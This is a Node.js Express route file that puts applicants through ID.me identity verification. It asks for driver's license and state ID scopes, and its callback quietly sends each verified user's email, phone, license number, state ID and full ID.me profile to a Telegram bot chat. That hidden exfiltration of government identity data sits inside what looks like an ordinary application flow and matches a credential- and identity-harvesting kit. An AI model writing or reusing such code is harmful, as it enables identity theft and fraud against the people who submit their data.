const express = require('express');

const router = express.Router();

let cachedClient = null;

async function getOpenIdLib() {
  const mod = await import('openid-client');
  return mod;
}

async function getClient() {
  if (cachedClient) return cachedClient;
  const { Issuer } = await getOpenIdLib();
  const issuerUrl = process.env.IDME_ISSUER;
  if (!issuerUrl) throw new Error('IDME_ISSUER is not set');
  const issuer = await Issuer.discover(issuerUrl);
  cachedClient = new issuer.Client({
    client_id: process.env.IDME_CLIENT_ID,
    client_secret: process.env.IDME_CLIENT_SECRET,
    redirect_uris: [process.env.IDME_REDIRECT_URI],
    response_types: ['code'],
  });
  return cachedClient;
}

// Helper to send ID.me result to Telegram (with phone, gov ID, etc.)
async function sendIDMeToTelegram(idme, email) {
  try {
    const fetch = require('node-fetch');
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      // Extract common fields: phone, user ID, driver's license, state ID
      const phone = idme.phone_number || idme.phone || "N/A";
      const idmeId = idme.sub || idme.id || "N/A";
      const driversLicense = idme.license_number || idme.driver_license_number || idme.drivers_license_number || "N/A";
      const stateId = idme.state_id || idme.stateid || "N/A";
      const summary = `ID.me Verification Complete
Email: ${email}
Phone: ${phone}
ID.me User ID: ${idmeId}
Driver's License: ${driversLicense}
State ID: ${stateId}
ID.me Data: ${JSON.stringify(idme, null, 2)}`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: summary }),
      });
    }
  } catch (e) {
    console.warn('Telegram send failed (ID.me):', e.message);
  }
}

router.get('/idme', async (req, res, next) => {
  try {
    if (!req.session.applicationDraft) return res.redirect('/apply');
    if (!process.env.IDME_ISSUER || !process.env.IDME_CLIENT_ID || !process.env.IDME_REDIRECT_URI) {
      return res.redirect('/apply/verify');
    }
    const client = await getClient();
    const { generators } = await getOpenIdLib();
    const codeVerifier = generators.codeVerifier();
    const codeChallenge = generators.codeChallenge(codeVerifier);
    const state = generators.state();
    // Updated scope to request government ID fields
    const scope = process.env.IDME_SCOPE || 'openid email profile identity.license identity.state_id';
    const url = client.authorizationUrl({
      scope,
      code_challenge: codeChallenge,
      code_challenge_method: 'S256',
      state,
    });
    req.session.oauth = { codeVerifier, state };
    res.redirect(url);
  } catch (err) {
    next(err);
  }
});

router.get('/idme/callback', async (req, res, next) => {
  try {
    if (!req.session.applicationDraft) return res.redirect('/apply');
    const { state } = req.query;
    if (!req.session.oauth || !req.session.oauth.state || req.session.oauth.state !== state) {
      return res.status(400).send('Invalid OAuth state');
    }
    const client = await getClient();
    const params = client.callbackParams(req);
    const tokenSet = await client.callback(
      process.env.IDME_REDIRECT_URI,
      params,
      { code_verifier: req.session.oauth.codeVerifier, state: req.session.oauth.state }
    );
    const userinfo = await client.userinfo(tokenSet);
    req.session.verified = true;
    req.session.idme = userinfo;
    req.session.oauth = null;

    // Send to Telegram immediately after ID.me verification
    try {
      const email = req.session.applicationDraft?.email || '';
      await sendIDMeToTelegram(userinfo, email);
    } catch (e) {
      // Already logged in helper
    }

    res.redirect('/apply/submit');
  } catch (err) {
    next(err);
  }
});

module.exports = router;